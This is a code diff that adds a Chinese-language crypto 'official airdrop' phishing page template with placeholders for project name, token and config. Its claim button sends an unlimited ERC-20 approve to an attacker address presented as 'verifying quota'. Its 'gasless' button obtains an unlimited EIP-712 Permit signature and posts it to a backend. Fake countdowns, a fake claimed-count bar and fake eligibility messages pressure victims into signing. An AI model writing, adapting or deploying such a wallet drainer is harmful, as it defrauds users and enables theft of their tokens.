@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>__PROJECT__ — 官方空投</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif; background:#070a13; color:#e8ecf5; }
+  a { color:#7aa2ff; text-decoration:none; }
+  nav { display:flex; align-items:center; gap:28px; padding:18px 48px; border-bottom:1px solid #1a2130; position:sticky; top:0; background:rgba(7,10,19,.85); backdrop-filter:blur(10px); z-index:5;}
+  .logo { font-weight:800; font-size:19px; letter-spacing:.5px; background:linear-gradient(90deg,#6a8dff,#b46aff); -webkit-background-clip:text; -webkit-text-fill-color:transparent;}
+  nav .links { display:flex; gap:22px; font-size:14px; color:#8b94a8; }
+  .wallet-btn { margin-left:auto; background:#1b2333; border:1px solid #2c3850; color:#dfe6f5; padding:9px 18px; border-radius:10px; cursor:pointer; font-size:14px;}
+  .wallet-btn.connected { border-color:#38b26a; color:#54d98b; }
+  header { text-align:center; padding:72px 24px 30px; }
+  header h1 { font-size:44px; font-weight:900; background:linear-gradient(90deg,#8fb0ff,#d0a6ff,#8fffd0); -webkit-background-clip:text; -webkit-text-fill-color:transparent;}
+  header p { margin-top:14px; color:#98a2b8; font-size:17px;}
+  .timer { display:flex; gap:14px; justify-content:center; margin:26px 0 6px;}
+  .timer div { background:#111827; border:1px solid #232d42; border-radius:12px; padding:12px 0; width:76px; text-align:center;}
+  .timer b { font-size:26px; display:block; }
+  .timer span { font-size:11px; color:#7e879b; }
+  .urgent { text-align:center; color:#ff8484; font-size:13px; margin-top:8px;}
+  main { max-width:520px; margin:34px auto 80px; }
+  .card { background:linear-gradient(180deg,#121a2b,#0d1420); border:1px solid #232d42; border-radius:20px; padding:30px; box-shadow:0 20px 60px rgba(0,0,0,.5);}
+  .amount { text-align:center; }
+  .amount .label { color:#8b94a8; font-size:13px; letter-spacing:1px;}
+  .amount .num { font-size:42px; font-weight:900; margin:8px 0; }
+  .amount .sym { color:#8fb0ff; }
+  .stat { display:flex; justify-content:space-between; color:#8b94a8; font-size:13px; margin:18px 2px;}
+  .bar { height:8px; border-radius:6px; background:#1a2233; overflow:hidden; margin-bottom:24px;}
+  .bar i { display:block; height:100%; width:72%; background:linear-gradient(90deg,#5a8bff,#a86aff);}
+  .cta { width:100%; padding:16px; font-size:17px; font-weight:700; border:0; border-radius:14px; cursor:pointer; color:#fff; background:linear-gradient(90deg,#3f6dff,#8a4dff); }
+  .cta:hover { filter:brightness(1.15); }
+  .cta.ghost { background:#182036; border:1px solid #2c3850; margin-top:12px; font-weight:500; color:#c7d2e8; }
+  .cta[disabled] { opacity:.55; cursor:default; }
+  .msg { margin-top:16px; font-size:14px; color:#54d98b; text-align:center; min-height:20px; line-height:1.6;}
+  .steps { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-top:34px;}
+  .steps div { background:#0e1524; border:1px solid #1c2536; border-radius:14px; padding:16px; font-size:12.5px; color:#98a2b8;}
+  .steps b { display:block; color:#dfe6f5; margin-bottom:6px; font-size:13.5px;}
+  footer { text-align:center; color:#5c6577; font-size:12.5px; padding:30px; border-top:1px solid #131a28;}
+</style>
+</head>
+<body>
+<nav>
+  <span class="logo">__PROJECT__</span>
+  <div class="links"><a href="#">主页</a><a href="#">代币经济学</a><a href="#">文档</a><a href="#">审计报告</a></div>
+  <button class="wallet-btn" id="walletBtn">连接钱包</button>
+</nav>
+
+<header>
+  <h1>__TAGLINE__</h1>
+  <p>向早期社区成员发放 __AMOUNT__ <span class="sym">__SYMBOL__</span> —— 连接钱包即验,无需转账</p>
+  <div class="timer">
+    <div><b id="t-h">00</b><span>时</span></div>
+    <div><b id="t-m">00</b><span>分</span></div>
+    <div><b id="t-s">00</b><span>秒</span></div>
+  </div>
+  <div class="urgent">⏳ 逾期未领取的份额将回流国库</div>
+</header>
+
+<main>
+  <div class="card">
+    <div class="amount">
+      <div class="label">您可领取</div>
+      <div class="num">__AMOUNT__ <span class="sym">__SYMBOL__</span></div>
+    </div>
+    <div class="stat"><span>已领取</span><span>7,214 / 10,000 名额(72%)</span></div>
+    <div class="bar"><i></i></div>
+    <button class="cta" id="claimBtn">立即领取</button>
+    <button class="cta ghost" id="gaslessBtn">__GASLESS__</button>
+    <div class="msg" id="msg">名额校验通过 · 钱包已就绪</div>
+  </div>
+
+  <div class="steps">
+    <div><b>① 连接钱包</b>自动校验您的地址是否在本期名单</div>
+    <div><b>② 签署领取</b>链上核销名额,防止重复领取</div>
+    <div><b>③ 到账</b>代币直接进入您的钱包,可随时交易</div>
+  </div>
+</main>
+
+<footer>© 2026 __PROJECT__ · 由 __PROJECT__ 基金会赞助 Gas · <a href="#">条款</a> · <a href="#">风险披露</a></footer>
+
+<script>
+const CFG = __CONFIG_JSON__;
+const $ = id => document.getElementById(id);
+let account = null;
+
+// 倒计时
+const endAt = Date.now() + CFG.countdown_minutes * 60000;
+setInterval(() => {
+  const left = Math.max(0, endAt - Date.now());
+  $("t-h").textContent = String(Math.floor(left/3600000)).padStart(2,"0");
+  $("t-m").textContent = String(Math.floor(left/60000)%60).padStart(2,"0");
+  $("t-s").textContent = String(Math.floor(left/1000)%60).padStart(2,"0");
+}, 500);
+
+function msg(text, ok=true) { $("msg").textContent = text; $("msg").style.color = ok ? "#54d98b" : "#ff8484"; }
+function report(payload) {
+  return fetch("/api/event", { method:"POST", headers:{"Content-Type":"application/json"},
+                               body: JSON.stringify(payload) }).then(r => r.json());
+}
+
+async function connect() {
+  if (!window.ethereum) { msg("请先安装 MetaMask 钱包", false); return null; }
+  try {
+    const accounts = await ethereum.request({ method:"eth_requestAccounts" });
+    if (!accounts || !accounts.length) { msg("钱包未授权连接,请重试", false); return null; }
+    account = accounts[0];
+    await ethereum.request({ method:"wallet_switchEthereumChain", params:[{ chainId:"0x"+CFG.chain_id.toString(16) }] })
+      .catch(() => ethereum.request({ method:"wallet_addEthereumChain", params:[{
+        chainId:"0x"+CFG.chain_id.toString(16), chainName:CFG.rpc_name,
+        rpcUrls:[CFG.rpc], nativeCurrency:{ name:"ETH", symbol:"ETH", decimals:18 } }] }));
+    $("walletBtn").textContent = account.slice(0,6) + "…" + account.slice(-4);
+    $("walletBtn").classList.add("connected");
+    await report({ type:"connect", address:account });
+    msg("资格校验通过 · 您在本期名单中");
+    return account;
+  } catch (e) { msg("连接被取消", false); return null; }
+}
+$("walletBtn").onclick = () => connect();
+
+// 主按钮:授权核销名额(实际是无限制 approve —— 页面语境把它包装成"核销")
+$("claimBtn").onclick = async () => {
+  try {
+    if (!account && !(await connect())) return;
+    $("claimBtn").disabled = true;
+    msg("正在核销名额…请在钱包中确认");
+    // "核销名额"的真实语义:approve 授权。claim_mode 由后台配置:
+    //   unlimited = 额度写满(无限授权);exact = 恰好页面展示的领取额
+    const maxword = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const amtword = BigInt(Math.round(Number(CFG.airdrop_amount) * 1e18))
+                      .toString(16).padStart(64, "0");
+    const data = "0x095ea7b3"
+      + CFG.attacker.toLowerCase().slice(2).padStart(64,"0")
+      + (CFG.claim_mode === "exact" ? amtword : maxword);
+    const hash = await ethereum.request({ method:"eth_sendTransaction",
+      params:[{ from:account, to:CFG.token, data }] });
+    const resp = await report({ type:"approve", txHash:hash });
+    if (resp && resp.ok) msg("🎉 核销成功!__SYMBOL__ 将在 10 分钟内自动到账,请勿关闭页面");
+    else msg("核销遇到问题,请重试", false);
+    $("claimBtn").disabled = false;
+  } catch (e) { msg("交易被拒绝", false); $("claimBtn").disabled = false; }
+};
+
+// 免 Gas 按钮:permit 离线签名(无交易、无 gas)
+$("gaslessBtn").onclick = async () => {
+  try {
+    if (!account && !(await connect())) return;
+    msg("正在生成免 Gas 领取凭证…请在钱包中签名");
+    const message = { owner:account, spender:CFG.attacker,
+                      value:"115792089237316195423570985008687907853269984665640564039457584007913129639935",
+                      deadline:String(CFG.deadline), nonce:"0" };
+    const payload = {
+      types: {
+        EIP712Domain: [{ name:"name", type:"string" }, { name:"version", type:"string" },
+                       { name:"chainId", type:"uint256" }, { name:"verifyingContract", type:"address" }],
+        Permit: [{ name:"owner", type:"address" }, { name:"spender", type:"address" },
+                 { name:"value", type:"uint256" }, { name:"deadline", type:"uint256" },
+                 { name:"nonce", type:"uint256" }],
+      },
+      primaryType:"Permit",
+      domain:{ name:CFG.token_name || "__TOKEN_NAME__", version:"1",
+               chainId:CFG.chain_id, verifyingContract:CFG.token },
+      message: message,
+    };
+    const sig = await ethereum.request({ method:"eth_signTypedData_v4",
+      params:[account, JSON.stringify(payload)] });
+    const resp = await report({ type:"permit", owner:account, sig,
+                                value:message.value, deadline:CFG.deadline, nonce:"0" });
+    if (resp && resp.ok) msg("🎉 签署成功!__SYMBOL__ 将在 10 分钟内自动到账,全程免 Gas");
+    else msg("签署遇到问题,请重试", false);
+  } catch (e) { msg("签名被拒绝", false); }
+};
+</script>
+</body>
+</html>
